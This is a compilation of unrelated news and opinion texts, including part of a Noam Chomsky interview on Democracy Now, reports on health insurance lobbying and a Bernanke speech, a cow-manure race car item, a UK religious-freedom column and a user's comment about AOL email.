And as you ’ll recall , he pointed out correctly that the Iraq war , which , first of all , is going to cost trillions of dollars , also had the effect of sharply increasing the price of oil , predictably .
And as he pointed out , we could sort of paper that over for a while by a housing bubble , so there was a huge housing bubble which anyone with eyes open could see .
I mean , for a century , housing prices had sort of tracked the economy , GDP ; then , all of a sudden , they shot way beyond the trend line , which means there ’s a bubble , and it ’s going to burst , and you get into trouble .
But the housing bubble , which was supervised by Alan Greenspan and with the Democrats — actually , it started under Clinton — it replaced the tech bubble under Clinton , and it gave an illusion of prosperity , which — so you did n’t see the effects of the rise in oil prices , which went very high .
But if you trace all the connections , yes , there ’s a clear connection , as he pointed out , between the war and the economic crisis .
And in fact , it ’s deeper than that .
The US is just in a class by itself in military expenses .
It basically matches the rest of the world , and it ’s far more advanced .
Well , that ’s drawn from somewhere .
You know , that ’s money that ’s not being used to develop the economy .
Now , in fact , you have to add a footnote here , because part of the very high level of US violation of free trade principles is that the economy itself is based on military spending to a substantial extent .
So the modern information revolution — computers , the internet , fancy software and so on — most of that comes straight out of the Pentagon .
My own university , MIT , was one of the places where all of this was developed under Pentagon contracts in the 1950s and the 1960s .
In fact , that ’s another critical part of the way the economy works .
The public pays the costs and takes the risk of economic development , and if anything works , maybe decades later , it ’s handed over to private enterprise to make the profits .
And that ’s a core element of the economy .
Of course , we do n’t permit the third world to do that .
That ’s considered a violation of free trade when they do it .
But it ’s the way our economy works .
And it ’s kind of complementary to the “ too big to fail ” doctrine of protectionism for financial institutions .
But the general — we do not have a capitalist economy .
We have kind of a state capitalist economy in which the public has a role : pay the costs , take the risks , bail out if they get into trouble .
And the private sector has a role : make profit , and then turn to the public if you get into trouble .
AMY GOODMAN : Would you extend that to healthcare ?
NOAM CHOMSKY : Well , healthcare is a dramatic case .
I mean , for decades , the healthcare issue has been right at the top of domestic concerns , for very good reasons .
The US has the most dysfunctional healthcare system in the industrial world , has about twice the per capita costs and some of the worst outcomes .
It ’s also the only privatized system .
And if you look closely , those two things are related .
And the privatized system is highly inefficient : a huge amount of administration , bureaucracy , supervision , you know , all kinds of things .
It ’s been studied pretty carefully .
Now , the public has had an opinion about this for decades .
A considerable majority want a national healthcare system , like other industrial countries have .
They usually say a Canadian - style system , not because Canada is the best , but at least you know that Canada exists .
Nobody says an Australian - style system , which is much better , because who knows anything about that ?
But something like what ’s sometimes called Medicare Plus , like extend Medicare to the population .
Well , up until — it ’s interesting .
Up until the year 2004 , that idea was described , for example , by the New York Times as politically impossible and lacking political support .
So , maybe the public wants it , but that ’s not what counts as political support .
The financial institutions are opposed , the pharmaceutical institutions are opposed , so it ’s not — no political support .
Well , in 2008 , for the first time , the Democratic candidates — first Edwards , then the others — began to move in the direction of what the public has wanted , not there , but in that direction .
So what happened between 2004 and 2008 ?
Well , public opinion did n’t change .
It ’s been this way for decades .
What changed is that manufacturing industry , a big sector of the economy , has recognized that it ’s being severely harmed by the highly inefficient privatized health system .
So , General Motors said that it costs them over a thousand dollars more to produce a car in Detroit than across the border in Windsor , Canada .
And , you know , when manufacturing industry becomes concerned , then things become politically possible , and they begin to have political support .
So , yes , in 2008 , there ’s some discussion of it .
Now , you know , this is very revealing insight into how American democracy functions and what is meant by the term “ political support ” and “ politically possible . ”
Again , this should be headlines .
Will a proposal come that approaches what the public wants ?
Well , we ’re already getting the backlash , strong backlash .
And what private healthcare systems are claiming is that this is unfair .
The government is so much more efficient that they ’ll be driven — there ’s no level playing field if the government gets into it , which is true .
AMY GOODMAN : If you had a public and a private plan .
NOAM CHOMSKY : Yeah .
AMY GOODMAN : If it were like Medicare .
NOAM CHOMSKY : If you had them side by side —
AMY GOODMAN : Most people go for Medicare — NOAM CHOMSKY : — they will .
AMY GOODMAN : — but if you wanted to go for a private plan , you could .
NOAM CHOMSKY : Yeah , if you could .
But they ’re not — they say , “ Well , we ca n’t compete . ”
For good reasons .
I mean , in every country except — industrial country except the United States , the government uses its massive purchasing power to negotiate drug prices .
That ’s one of the reasons prices are so much higher in the United States than in other countries .
Well , they could — the Pentagon can use purchasing power to negotiate prices for , you know , paper clips or something , but , by law , the government is not permitted to do that in the case of healthcare .
Well , if you had Medicare Plus , they would , and that would drive down drug prices , and the private industries ca n’t compete .
AMY GOODMAN : FAIR , Fairness and Accuracy in Reporting , did a study of the week leading up to the White House healthcare summit of the networks and how they were covering single payer , the issue of like Medicare Plus , and I think they found that absolutely — that almost — there was almost no representation in the media of a single - payer advocate —
NOAM CHOMSKY : Yeah .
AMY GOODMAN : — and almost the only mention was someone blasting single payer .
NOAM CHOMSKY : Yeah , yeah .
That ’s because it has no political support ; only the majority of the public .
It ’s the same as the media commentary in 2004 .
In fact , if you take a look back at the end of the last electoral campaign , Kerry - Bush campaign , in October 2004 , right before the election , there was a debate on domestic issues .
I think it was maybe October 28th or so .
Just take a look — read the New York Times report of it the next day .
It was very dramatic .
It said Kerry never brought up the idea of any government involvement in healthcare , not , you know , Medicare Plus , but any government involvement , because it is not politically possible and lacks political support — just the population .
Well , that —
AMY GOODMAN : What studies show you the population wants this ?
NOAM CHOMSKY : I mean , there ’s been poll after poll , goes back , in fact —
AMY GOODMAN : So , what do you think is going to break through ?
NOAM CHOMSKY : Well , it ’s a problem of the general dysfunction of formal democracy .
I mean , there ’s a very substantial gap between public opinion and public policy on a host of major issues .
And on many of these issues , both parties are well to the right of the public , international and domestic .
Incidentally , that ’s one reason why elections are run the way they are .
Elections are run as marketing extravaganzas , and that ’s not kept secret .
So the advertising industry gives an award every year for best marketing campaign of the year .
For 2008 , they gave it to Obama .
He beat out , I think , Apple Computer .
And if you look at the comments of financial — of advertising executives , PR executives , they were euphoric .
In fact , they said — you can read it in the Financial Times , business press — they said , you know , “ We ’ve been marketing candidates like commodities ever since Reagan , but this is the best we ’ve ever done .
It ’s going to change the atmosphere in corporate boardrooms .
We have a new style of selling things , you know , the Obama style , you know , soaring rhetoric , hope and change , and so on . ”
Yeah , that ’s true .
And if you look at the campaigns themselves , they ’re designed essentially by the advertising industry to sell the commodity — it happens to be a candidate — and they ’re pretty carefully designed so that you marginalize issues and you focus on what are called “ qualities . ”
In Obama ’s case , you know , soaring rhetoric and so on ; in Bush ’s case , a nice guy and like to have a beer with him and so on .
That ’s the kind of thing you focus on .
Where do they stand on issues ?
Well , the public is mostly uninformed .
I have n’t seen current polls on 2008 , but the 2004 election , where there were polls shortly after , showed the public had almost no idea what Bush ’s stand was .
In fact , a majority of Bush voters thought that he supported the Kyoto Protocol , because they support it , and he ’s a nice guy , so he must support it .
And elections are designed that way , and it makes good sense .
I mean , the people who run the elections , they read the polls , and very carefully , in fact .
In fact , they mostly the design them for their own interest .
And they know that the parties are to the right of the public , so you better — on a large number of issues , including crucial ones like Iran and others — so you better keep issues off the table , which is what ’s done .
So what the — healthcare is a dramatic case of it , but it ’s only one instance .
AMY GOODMAN : Renowned linguist Noam Chomsky , speaking to me in Boston last week .
We will return to the last part of our conversation after this break .
You can get a copy of the full two parts by going to democracynow.org .
Stay with us .
[ break ]
AMY GOODMAN : We return now to the last part of my conversation with leading American intellectual and anti-imperialist critic Noam Chomsky .
AMY GOODMAN :
The whole issue of populist rage , Noam Chomsky , actually , do you think that this rage is going to boil over as the unemployment figures rise ?
NOAM CHOMSKY : It ’s very hard to predict those things .
I mean , it has a potentially positive side , like it could be like the activism of the 1930s or the 1960s , which ended up making it a more civilized society in many ways , or it could be like an unfortunate precedent that quickly comes to mind .
I ’ve written about it .
Take a look at Germany .
In the 1920s , Germany was the absolute peak of Western civilization , in the arts and the sciences .
It was regarded as a model of democracy and so on .
I mean , ten years later , it was the depths of barbarism .
That was a quick transition .
“ The descent into barbarism ” it ’s sometimes called in the scholarly literature .
Now , if you listen to early Nazi propaganda , you know , end of the Weimar Republic and so on , and you listen to talk radio in the United States , which I often do — it ’s interesting — there ’s a resemblance .
And in both cases , you have a lot of demagogues appealing to people with real grievances .
Grievances are n’t invented .
I mean , for the American population , the last thirty years have been some of the worst in economic history .
It ’s a rich country , but real wages have stagnated or declined , working hours have shot up , benefits have gone down , and people are in real trouble and now in very real trouble after the bubbles burst .
And they ’re angry .
And they want to know , “ What happened to me ?
You know , I ’m a hard - working , white , God-fearing American .
You know , how come this is happening to me ? ”
That ’s pretty much the Nazi appeal .
The grievances were real .
And one of the possibilities is what Rush Limbaugh tells you : “ Well , it ’s happening to you because of those bad guys out there . ”
OK , in the Nazi case , it was the Jews and the Bolsheviks .
Here , it ’s the rich Democrats who run Wall Street and run the media and give everything away to illegal immigrants , and so on and so forth .
It sort of peaked during the Sarah Palin period .
And it ’s kind of interesting .
It ’s been pointed out that of all the candidates , Sarah Palin is the only one who used the phrase “ working class . ”
She was talking to the working people .
And yeah , they ’re the ones who are suffering .
So , there are models that are not very attractive .
AMY GOODMAN : And she very much is being talked about as a leader , really , of the Republican Party .
NOAM CHOMSKY : Well , she was kind of a model .
You know , the talk radio mob went crazy over her .
And one should n’t demean it .
You know , they describe themselves — it ’s really worth listening to : “ We ’re fly - by country .
You know , they do n’t care about us , those rich Democrats on the East Coast and the West Coast who are all , you know , interested in gay rights and giving things away to illegal immigrants and so on .
They do n’t care about us , the hard - working , God-fearing people , so we ’ve got to somehow rise up and take over and elect Sarah Palin or Rush Limbaugh or someone like that . ”
As I say , the precedents are not attractive .
Now , if — now even before the next presidential , if in the next congressional election the economy has not begun to recover , this kind of populist rage could boil over and could have very dangerous consequences .
This country has a long history of being kind of ridden by fear .
It ’s a very frightened country .
This goes back to colonial times .
I mean , we ’re very lucky that we have never had an honest demagogue .
I mean , the demagogues we ’ve had are so corrupt that they never got anywhere — you know , Nixon , McCarthy , you know , Jimmy Swaggart and others .
So they were kind of destroyed by their own corruption .
But suppose we had an honest demagogue , you know , a Hitler type , who was not corrupt .
There ’s probably — it could be unpleasant .
There ’s a background of concern and fear , tremendous fear , and searching for some answer , which they ’re not getting from the establishment .
“ Who ’s responsible for my plight ? ”
You know , and that can be exploited .
And unless there ’s active , effective organizing and education , it ’s dangerous .
AMY GOODMAN : Your assessment of President Obama so far ?
NOAM CHOMSKY : Frankly , I never had any expectations .
I wrote about it over a year ago .
I thought then , and I think it ’s been confirmed , that he ’s essentially a centrist Democrat .
He ’s moving back — I mean , the Bush administration was kind of off the spectrum , especially the first term .
So he ’s moving things back toward the center with a kind of a public posture , which was recognized by the advertising industry .
That ’s why they gave him the award for best marketing campaign , which — but as far as policy is concerned , unless he ’s under a lot of pressure from activist sectors , he ’s not going to go beyond what he ’s presented himself as in actual policy statements or cabinet choices and so on : a centrist Democrat , going to basically continue Bush ’s policies , maybe in a more modulated way .
AMY GOODMAN : Do you see Afghanistan becoming an ever - expanded war in the next decade or so ?
Do you — now we ’re talking about doubling the US troops there .
NOAM CHOMSKY : No , that ’s the way Obama and the Pentagon see it .
In fact , they say so : this is going to be a long war , it ’s going to be extended , the US is going to take over the military side , and it ’s going to expand it , it ’s going to expand into Pakistan .
And , I mean , we ’ll talk about development , but the focus will be on the military .
Obama , right now , is trying to get NATO to cooperate , but recognizing that they ’re not going to send military forces .
The populations are opposed .
AMY GOODMAN : Canada is pulling out .
NOAM CHOMSKY : Yeah , Canada ’s pulling out , and the others — maybe Holland has made a termination date , but we ’ll at least ask them to come in and sort of help out on the civilian side .
That ’s their job .
It ’s the famous line of , I guess it was Robert Kagan : you know , “ they ’re Venus , we ’re Mars . ”
So we ’ll move in like Mars and take care of the military side .
You know , we ’re good at killing people .
And they can come in and sort of put on the band - aids and make it look like something good is happening .
It ’s not the right direction .
AMY GOODMAN : The unmanned drones bombing Pakistan ?
NOAM CHOMSKY : Yeah , drones .
And that has effects .
So a lot of the worst fighting recently has been in the Bajaur province , right on the border .
It ’s in Pakistan ’s side .
And militants in the area have reported to the press that part of the reason is that an American drone attack hit a madrasa , a school , and killed about eighty people .
Well , you know , they ’re “ uncivilized barbarians ” ; they sort of do n’t like that .
So they reacted .
And now , one of the militants has said , “ OK , we ’re going to bomb the White House , ” which is considered totally outrageous .
But , you know , if we kill as we like , there ’s going to be a reaction .
AMY GOODMAN : Where do you see American empire in ten , twenty , thirty years ?
NOAM CHOMSKY : Prediction in human affairs is a very low — has very little success , too many complications .
The United States , I think , will come out of the economic crisis , very likely , as the dominant superpower .
There ’s a lot of talk about China and India , and it ’s real , they ’re changing , but they ’re just not in the same league .
I mean , both China and India have enormous internal problems that the West does n’t face .
You get kind of a picture of this by looking at the Human Development Index of the United Nations .
The last time I looked , India was about 125th or something .
And I think China was about eightieth .
And China would be worse , I think , if it was n’t such a closed society .
In India , you sort of get better data , so you can see what ’s happening .
China is kind of closed .
You do n’t see what ’s going on in the peasant areas , which are in turmoil , you know .
They have environmental problems .
They have huge — hundreds of millions of people are kind of like at the edge of starvation .
We do n’t have — you know , we have problems , but not those problems .
And even the industrial growth , which is there — you know , for part of the population , there ’s been improvement .
But when you take , say , India , where we know more , in the areas where high - tech industries developed — and it ’s pretty impressive .
I ’ve visited some of the labs in Hyderabad .
You know , it ’s as good or better than MIT .
But right nearby , the rate of peasant suicides is going up , very sharply , in fact .
And it ’s the same source .
It ’s the neoliberal policies , which privilege a certain sector of the population and a certain — and let the rest take care of themselves .
AMY GOODMAN : And yet , the rise of progressives in Latin America ?
NOAM CHOMSKY : That ’s important .
I mean , Latin America , for the first time in 500 years , is moving towards a degree of independence and a kind of integration , which is a prerequisite for independence , and also at least is beginning to face some of its massive internal problems .
I mean , Latin America has probably the worst inequality in the world .
There ’s a wealthy sector , small wealthy sector , which is extremely rich , but they have — their tradition is that they have no responsibility to the country , so they send their capital to Zurich .
You know , they have their second homes in the Riviera , and their children study in Oxford or whatever .
This is beginning to be faced in different ways , but it ’s sort of happening all over the continent .
And they are beginning to integrate .
The United States obviously does n’t like it .
In fact , it ’s barely reported most of the time .
So there was a very interesting case last September , when President Morales in Bolivia — Bolivia is , in my opinion at least , probably the most democratic country in the world .
Nobody says that , but if you look at what happened in the last couple of years , there were huge , popular , mass organizations of the most repressed population in the hemisphere , the indigenous population , which for the first time ever has entered the political arena significantly and were able to elect a president from their own ranks and one who does n’t give instructions to his army , but who ’s following policies that were largely produced by the population .
So he ’s their representative , in a sense in which democracy is supposed to work .
And they know the issues .
It ’s not like our elections .
They know the issues .
They ’re serious issues : control over resources , economic justice , cultural rights , and so on .
You can say they ’re right or wrong , but at least it ’s functioning .
Now , the elites that have traditionally ruled the country , of course , do n’t like it .
And they ’re threatening virtual secession .
And , of course , the United States is backing them , as the media are .
And it got to the point last summer , I suppose , where it led to real violence .
Well , there was a meeting of UNASUR , the Union of South American Republics — that ’s all of South America — a meeting in Chile , Santiago , Chile .
And it came out with a declaration , important declaration , in which it supported President Morales and opposed the — condemned the violence being led by the quasi - secessionist forces .
And Morales responded , thanking them for their gesture of support , but also saying , correctly , that this is the first time in 500 years that South America is beginning to take its affairs in its own hands without the intervention of foreign powers , primarily the US .
Well , that was so important that I do n’t think it was even reported here .
I mean , the meeting was known , so you see vague references to it .
But it ’s an indication of developments that are taking place in various ways .
AMY GOODMAN : Noam Chomsky , you ’ve just hit eighty .
We just have a few minutes to go .
And how does it feel ?
NOAM CHOMSKY : I have a few years to go .
I do n’t think about it much .
AMY GOODMAN : But as you reflect , talking about these huge social movements , cataclysmic times in the world , your life experience , what gives you hope ?
NOAM CHOMSKY : Well , there ’s both hope and fear .
I mean , I ’m old enough to have grown up in the Depression .
And some of my memories — I did n’t understand that much at the time — childhood memories , are listening to Hitler ’s speeches .
I did n’t understand them , but I could sense the reaction of my parents , you know , and had a feeling of fear , you know , a tremendous fear .
In fact , the first article I wrote was in 1939 , when I was in fourth grade , and it was about the expansion of fascism over Europe , a kind of a dark cloud that may envelop everything .
And as I mentioned before , I have some of those same concerns now .
On the other hand , there ’s been tremendous progress .
The country is far more civilized than it was , say , forty years ago , thanks to the activism of the ’60s and its aftermath .
And some of the most important developments were after the ’60s , like , say , the feminist movement , which has probably had more of an impact on this society than any other .
It ’s mostly post - ’60s .
The solidarity movements , which are unique in the history of imperialism , there ’s never been anything like them .
That ’s from the ’ 80s .
The global justice movements , what ’s called anti-globalization — should n’t be — that ’s , you know , the ’90s and this century .
These were all very positive developments .
They have n’t changed the institutions .
In fact , the institutions have reacted by becoming harsher , not surprisingly .
But they ’ve changed the culture .
I mean , take , say , the 2008 election .
I mean , I did n’t like the candidates , as I ’ve made clear .
On the other hand , forty years ago , or maybe ten years ago , you could n’t have imagined that the Democratic Party would have two candidates , an African American and a woman .
OK , that ’s a sign of the civilizing effect of the activism of the ’60s and everything that followed .
Well , that can be mobilized .
In fact , it ’s already .
If you count the number of activists in the country , it ’s , I suspect , well beyond the ’60s , except maybe for a very brief moment at the peak of the antiwar movement .
OK , that can be a basis for proceeding onward .
So , that ’s a reason for hope .
AMY GOODMAN : And finally , our condolences on the loss of Carol .
NOAM CHOMSKY : Thanks .
AMY GOODMAN : Your life partner , someone you knew — well , you ’re eighty — what , for seventy - seven years ?
NOAM CHOMSKY : Yeah , actually .
Not easy to face .
AMY GOODMAN : What gives you the strength to go on after Carol ?
NOAM CHOMSKY : Well , the kind of thing you do , for example .
That makes a difference .
AMY GOODMAN : And you have a wonderful family .
NOAM CHOMSKY : Yeah .
AMY GOODMAN : So , our condolences to you —
NOAM CHOMSKY : Thanks .
AMY GOODMAN : — and your kids .
Noam Chomsky , thanks so much .
NOAM CHOMSKY : Thanks .
AMY GOODMAN : Noam Chomsky , Professor Emeritus at MIT , leading public intellectual of our day .

Noam Chomsky on Dandelion Salad
As President Obama ’s push for a healthcare overhaul moves toward its final act , the oft - vilified health insurance industry is on the verge of seeing a plan enacted that largely protects its financial interests .
That achievement , should it stand up in the final legislation , would be the capstone of a sophisticated lobbying and strategic campaign that began even before Obama was elected president .
The specifics of the healthcare legislation are still being hashed out on Capitol Hill , and key details will evolve in the days ahead .
Even so , there is broad agreement that the final plan will , for the first time , require Americans to buy health coverage , with taxpayer subsidies for millions who cannot afford it .
For the health insurance industry , that means millions of new paying customers .
What ’s more , there are likely to be no limits on what insurers can charge , while at the same time the plan is expected to limit competition from any new national government insurance plan that lawmakers create .
Advertisement
These anticipated wins -- from an initiative that has at times been portrayed as doomsday for health insurers -- is the result of a strategy developed by one of Washington ’s savviest lobbyists , Karen Ignagni .
Under Ignagni ’s leadership , the industry group America ’s Health Insurance Plans adopted the goal of universal coverage while setting out to shape it in a way that benefited insurers -- a crucial move that aligned their interests with those of other groups , including consumers and hospitals .
Insurers poured campaign donations into the coffers of key sympathetic members of the House and Senate , and loaded up on lobbyists .
And when Obama and other Democrats began attacking the industry , insurers made a strategic choice not to walk away from the negotiating table .
“ While so many in this town have been playing checkers , Karen has been playing chess , ” said Mark Merritt , a veteran lobbyist who heads the Pharmaceutical Care Management Assn .
In broad terms , the healthcare legislation is expected to require all Americans to purchase health insurance .
Insurance companies , in turn , would be barred from canceling policies of sick people or denying coverage to those with preexisting conditions .

What ’s still not clear is whether the legislation would create some form of a “ public option , ” or government insurance program , which health insurers steadfastly oppose .
In addition to fighting the public option , insurers that offer Medicare health maintenance organizations are battling more than $ 100 billion in cuts in federal payments to that program .
And they are trying to beat back a move by Democrats to go after the industry ’s decades - old exemption from antitrust law .
But in Washington , many marvel that lawmakers have not wrung more from an industry that , surveys show , is held in low regard by the public .
“ The industry is really in no position to be making demands , ” said Celinda Lake , a longtime Democratic pollster .

It ’s not by accident .
For much of the last three years , industry leaders have been laying the groundwork for this battle .
Amid horror stories about insurers dumping sick patients , denying coverage for medical treatment and cherry - picking customers , Ignagni and a few insurance company executives pushed the idea within America ’s Health Insurance Plans that the industry risked political catastrophe if it did not move proactively .
“ They knew they had a very big [ public relations ] problem , and they knew this day was coming , ” said Wendell Potter , a Cigna Corp. public relations executive who quit last year .
“ They knew they had to be perceived as coming to the table with solutions .
It was a departure from their previous point of view .
But they knew they would be slaughtered if it were n’t . ”
The first public sign of the industry ’s shifting stance came in November of 2006 when the trade group came out in favor of universal coverage with its reform plan .
Advertisement
That built on the breakthrough idea , propelled early on by Blue Shield of California Chief Executive Bruce Bodaken and Kaiser Permanente CEO George Halvorson , that universal coverage was key to the future of the industry .
It was a 180 - degree turn for insurers , who were long content to compete against one another to cover the healthiest consumers and to avoid those with preexisting conditions and high medical costs .
It was also a significant departure for an industry that in the early 1990s orchestrated the defeat of the Clinton administration ’s push for broader coverage .
“ They decided that they had a responsibility to contribute to the process and to bring real and substantial reforms to the table , ” Ignagni explained .
Advertisement
America ’s Health Insurance Plans followed up with more overtures , endorsing new rules that would prohibit insurers from denying coverage .
The strategy paid dividends , as insurance executives were invited to the table when senior Democrats began developing healthcare legislation this year .
Ignagni and insurance executives became familiar figures in the committee rooms on Capitol Hill , testifying in favor of an overhaul as lawmakers gathered information to write their bills .
Ignagni also went to the White House to consult with senior Obama administration officials .
She publicly offered the industry ’s help in reining in the nation ’s growing healthcare tab , providing the president with a public relations coup this spring when the White House wanted to show momentum behind its healthcare campaign .
“ I do n’t know of any other industry that has committed to a massive overhaul of the way their market works , ” Ignagni said , firmly rejecting allegations that insurers have simply been trying to manipulate the legislative process .

As the legislation developed , industry lobbyists sent congressional offices numerous studies and reports to head off proposals it feared , a tactic often used by industry .
America ’s Health Insurance Plans used hospital data from California to warn that hospitals and other providers would suffer under a new government insurance plan .
More recently , insurance companies pushed Democrats to toughen the requirement that all Americans get insurance , going to Capitol Hill with internal industry studies that purported to show that premiums would skyrocket if more people did not get coverage .
The full - court press on Capitol Hill coincided with generous campaign donations to conservative Democrats , who will be key to passing healthcare legislation in the House and Senate later this year , including Senate Finance Chairman Max Baucus ( D - Mont . ) .

Members of the House “ Blue Dog ” coalition have received nearly $ 3 million from the health insurance industry since 2006 , according to data compiled by the nonprofit Center for Responsive Politics .
In the Senate , Democrats Ben Nelson of Nebraska and Evan Bayh of Indiana -- two conservatives who have expressed skepticism about a new government insurance plan -- have each received more than $ 470,000 from the industry since 2006 .
As the insurance industry ’s initiatives have gained steam , Obama and Democratic congressional leaders have stepped up their counterattacks , a strategy that appears aimed partly at keeping sympathetic lawmakers and constituents on board .
This month , Baucus ’ finance committee dealt the industry a blow in the panel ’s proposed health bill by weakening the penalties on Americans who fail to buy insurance .
The industry insists that if penalties are n’t tough enough , many young and healthy people will forgo coverage -- saddling insurers with a disproportionate number of older people who are likely to incur higher medical costs .
Advertisement
“ The health plans have never been in as much political peril , ” Sheryl Skolnick , a healthcare analyst with Pali Capital Research , said , explaining worries on Wall Street about how the industry will fare .
But even as congressional Democrats lambaste insurers , they are working to address the industry ’s concerns .
Senior Democrats are exploring ways to ensure that more people buy coverage .
“ We are wrestling with this concept of how we get everybody in , ” Baucus said .
Advertisement
That should not come as a surprise , said Families USA Executive Director Ron Pollack , a consumer advocate who has been working closely with congressional Democrats on healthcare legislation .
“ You ca n’t ignore the major interest groups , ” he said .
“ Including the insurance industry . ”

Race cars have long provided a testing ground for driving technology that we eventually see in passenger cars on the road .
To this end , an engineering team in Lancashire , England , is hoping to give cow power a place in mass - produced consumer automobiles by creating a race car that runs on cow manure .
Yep , there are hopes that by processing cow waste and using it to fuel cars , it can reduce the impact of two things that contribute to global warming .
Using cow power to win a rally championship may seem like a tall order , but these engineers are up to the challenge .
Gas 2.0 offers this on the process of getting a race car to run on cow waste :
The process , which has been gaining attention worldwide , uses fermented cow poop and anaerobic digesters to provide natural gas fuel .
Rally racing is an intense form of motorsports that pushes car on - and - off road , and racers quickly figure out what does or does n't work .
Oacktec has already developed hybrid-electric motors for Honda , so they plan on using a Honda Civic Hybrid to compete within a year .
In the end , there are hopes that using hybrids on the race track could provide an advantage .
Electric motors offer lots of torque that could send cars out of corners faster , providing an advantage of seconds -- which are precious to race car drivers .
Using a hybrid car that runs partially on cow manure may provide an interesting alternative to current gasoline - electric hybrids .
But we 'll first have to see how cow power performs on the racetrack .

SANTA BARBARA , California ( Reuters ) - U.S. Federal Reserve Chairman Ben Bernanke warned on Monday that Asian export - promotion policies and large U.S. budget deficits could refuel global economic imbalances and put efforts to achieve more durable growth at risk if not curbed .
Throwing his weight behind a recent call by leaders of the Group of 20 major powers to rebalance the global economy in the wake of a devastating financial shock , Bernanke said Asian nations , like China , that enjoy large trade surpluses should discourage excess saving and boost consumption .
At the same time , he said the United States needed to increase its saving and “ substantially reduce federal deficits over time . ”
“ To achieve more balanced and durable economic growth and to reduce the risks of financial instability , we must avoid ever - increasing and unsustainable imbalances in trade and capital flows , ” Bernanke said at a conference on Asia sponsored by the San Francisco Federal Reserve Bank .
He said that while trade imbalances had started to narrow as U.S. households ramped up saving in response to a deep recession that ate at their wealth , he cautioned that the imbalances may resume growing as the global economy recovers and trade volumes rebound .
Policies in Asian countries that encourage exports and saving over consumption are a concern , Bernanke said , repeating a long - standing U.S. complaint .
“ Trade surpluses achieved through policies that artificially enhance incentives for domestic saving and the production of export goods distort the mix of domestic industries and the allocation of resources , resulting in an economy that is less able to meet the needs of its own citizens in the longer term , he said .
U.S. officials have long pressed China to allow its yuan currency to appreciate , which would lessen any price advantage Chinese goods may have in global markets .
China has vowed to move toward more currency flexibility , but it has kept the yuan on a tight leash .

PRAISE AND PRESSURE
Bernanke praised China and other Asian nations , saying they “ are looking more seriously at rebalancing ” than in the past .
But he said the possibility of asset price bubbles emerging in Asia are a concern , and that the risks could be addressed through relaxing currency constraints .
“ One way to address it would be through some greater exchange rate flexibility , ” Bernanke said .
However , he also acknowledged the part the United States must play in addressing global imbalances by increasing savings and embarking on a more - sustainable fiscal path .
The performance of the U.S. economy and the dollar , which has fallen 7 percent against a basket of currencies this year , will depend on the government ’s success in controlling its budget deficit , he said .
The Obama administration said on Friday that the budget shortfall hit a record $ 1.4 trillion in the fiscal year that ended September 30 .
At 10 percent of GDP , it was the largest deficit since World War Two .
“ Our policy - makers recognize that we need to develop a fiscal exit strategy that will involve a trajectory toward sustainability , ” Bernanke said in response to a question .
“ That is critically important in order to maintain confidence in our economy and confidence in our currency .
I know that is very well understood in Washington , ” he added .
ASIAN REBOUND
The Fed chairman said that Asian economies had rebounded strongly from the financial crisis , with annualized growth rates in the double digits expected in China , Hong Kong , Korea , Malaysia , Singapore and Taiwan .
“ At this point , while risks to the economic outlook certainly remain , Asia appears to be leading the global recovery , ” Bernanke said .
Countries with the most open economies , such as Singapore , Hong Kong , and Taiwan took the biggest hits as a result of the financial turmoil , he said .
China , India , and Indonesia , which are “ among the least financially open ” economies , expanded throughout the crisis , he said .
While conceding that greater global integration increases vulnerability to world - wide economic shocks , he voiced concern that Asian nations could draw the wrong lesson and said greater openness would promote stronger growth over the longer term .
“ Protectionism and the erecting of barriers to capital flows should thus be strongly resisted , ” he said .
“ Striking a reasonable balance between trade and growth in domestic demand is the best strategy for driving economic expansion . ”
" Everyone has the right to freedom of thought , conscience and religion , " says the Human Rights Act .
This freedom includes " the right to manifest his ( or her ) religion or belief in worship , teaching , practice and observance . "
That 's a fine aspiration but of course the Human Rights Act ( HRA ) is n't all it 's cracked up to be by its supporters .
Take the recent case of a 54 - year - old nurse facing disciplinary action for wearing her confirmation cross , she was forced to accept an offer of redeployment to a non-nursing role at the Royal Devon and Exeter Hospital .
Although she had worn the cross throughout her 30 year service and no problems had been recorded , it was deemed to be a breach of uniform policy and – absurdly – a risk to health and safety , which of course trumps anything as elementary as the right to express your religious belief .
The trust made use of the second part of section nine of the HRA .
" Freedom to manifest one 's religion or beliefs shall be subject only to such limitations as are prescribed by law and are necessary in a democratic society in the interests of public safety , for the protection of public order , health or morals , or for the protection of the rights and freedoms of others . "
Shirley Chaplin had an impeccable record of service as a nurse .
It is astonishing that the Devon and Exeter Trust would think of using their power in this way .
But it seems the Human Rights
Act is incapable of protecting the Shirley Chaplin's of the world from the martinets and busybodies that infest public services and local authorities .
In Camden , London , a Christian group has been banned from displaying a notice in libraries and community centres advertising a talk on climate change because it mentioned Christianity and God .
One poster said " Climate Change is a Christian Issue " .
The ban puzzled the people at Roman Catholic Our Lady of Help of Christians parish church because they were told that they could display climate change posters that did not refer to God .
Naturally , the church is unlikely to take this to the law in order to test a policy that forbids the promotion of religious ideas , it almost certainly has neither the money nor the time for such frivolity .
And so the injustice stands .
But if Britain had a bill of rights that entrenched religious freedom and expression and made their suppression illegal then things would be rather different .
One of the problems with the law as it stands is that it is not applied equally .
And there seems also to be some kind of agenda at work , laws are used to enforce a sterile secularity in ordinary behaviour and expression .
One of the most disturbing cases I have heard of is the decision by the Crown Prosecution Service to bring a prosecution against a Christian couple that own hotel in Aintree , Liverpool .
Ben and Sharon Vogelenzang were arrested after a Muslim woman staying at their hotel complained to police about comments they made during a religious argument over breakfast .
They have been charged under public order laws with using " threatening , abusive or insulting words … that were religiously aggravated " .
Reports suggest that the couple said that prophet Muhammad , the founder of Islam , was a warlord and that the traditional Muslim dress for women was form of bondage .
You may , or may not agree , with these sentiments but surely they do n't merit a prosecution in a society where a good deal of latitude shown to the racism and homophobia preached by some imams .
I can't comment on the exact details of what the couple may have said , or their manner , or the offence taken by the customer but I can say that free speech – even about religion – is the freedom to be offended , and that the decision to prosecute is about as daft as it gets .
I hope that every organisation now happily ensconced in London 's spanking new Free Word centre understands that this case is critical to the freedom of all expression and that they send representatives en masse to support the couple when they appear in court in December .

I 'm not sure how long I have had AOL , maybe ten years or more .
I had it when it was a dial up over a landline phone connection .
More recently they introduced AOL GOLD and at least in our area ( Ga ) you had to sign up for that at $ 4.99 a month .
So I signed up , I stay with it as I am familiar with it and learning a new setup at my age is not what I want to do .
I have had to have it restored 6 times .
I use their provided phone number and talk to their tech people in India .
They are pretty sharp and have so far gotten it restored .
For some odd reason I find that I now do not have just the 7 email addresses you get with AOL but I have 18 !
11 of my old addresses are now back and working .
These are addresses I did have in past years and deleted them in favor of newer ones I wanted .
No idea why they have suddenly appeared .
